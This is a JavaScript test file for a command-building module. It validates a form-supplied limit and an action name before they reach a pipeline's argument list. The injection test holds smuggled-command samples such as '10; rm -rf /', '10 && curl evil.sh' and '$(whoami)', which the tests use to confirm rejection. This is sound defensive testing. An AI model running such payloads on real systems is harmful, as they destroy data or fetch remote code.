import assert from 'node:assert/strict';
import { test } from 'node:test';
import {
  buildPipelineCommand,
  InvalidCommandError,
  logFileName,
  MAX_LIMIT,
  parseAction,
  parseLimit,
} from './runCommand.js';

test('builds the argv for a fetch run', () => {
  assert.deepEqual(buildPipelineCommand('run', 10), {
    args: ['run', '--limit', '10'],
    label: 'Fetching 10 stores',
  });
});

test('singular label for a batch of one', () => {
  assert.equal(buildPipelineCommand('run', 1).label, 'Fetching 1 store');
});

test('builds the argv for the demo seed', () => {
  assert.deepEqual(buildPipelineCommand('seed'), { args: ['db', 'seed'], label: 'Seeding demo data' });
});

test('accepts a numeric string from a form field', () => {
  assert.equal(parseLimit('25'), 25);
  assert.equal(parseLimit(' 7 '), 7);
});

test('rejects a limit outside the allowed range', () => {
  assert.throws(() => parseLimit(0), InvalidCommandError);
  assert.throws(() => parseLimit(MAX_LIMIT + 1), /between 1 and 100/);
  assert.throws(() => parseLimit(-5), InvalidCommandError);
});

test('rejects a non-integer limit', () => {
  assert.throws(() => parseLimit(2.5), /whole number/);
  assert.throws(() => parseLimit('abc'), /whole number/);
  assert.throws(() => parseLimit(''), /whole number/);
  assert.throws(() => parseLimit(null), /whole number/);
  assert.throws(() => parseLimit(undefined), /whole number/);
});

test('never lets an injected string reach the argument list', () => {
  // The form field is the only user input; it must not survive as text.
  for (const attack of ['10; rm -rf /', '10 && curl evil.sh', '$(whoami)', '10\n--force']) {
    assert.throws(() => parseLimit(attack), InvalidCommandError, `should reject: ${attack}`);
  }
});

test('rejects an unknown action', () => {
  assert.throws(() => parseAction('migrate'), /Unknown action/);
  assert.throws(() => parseAction('run; ls'), /Unknown action/);
  assert.throws(() => parseAction(undefined), /Unknown action/);
});

test('accepts the known actions', () => {
  assert.equal(parseAction('run'), 'run');
  assert.equal(parseAction('seed'), 'seed');
});

test('log file names are filesystem-safe and unique per invocation', () => {
  const name = logFileName('run', new Date('2026-08-28T09:30:15.123Z'));
  assert.equal(name, 'ui-run-2026-08-28T09-30-15-123Z.log');
  assert.doesNotMatch(name, /[:/\\]/, 'no path or colon characters');
  assert.notEqual(logFileName('run', new Date(1)), logFileName('run', new Date(2)));
});
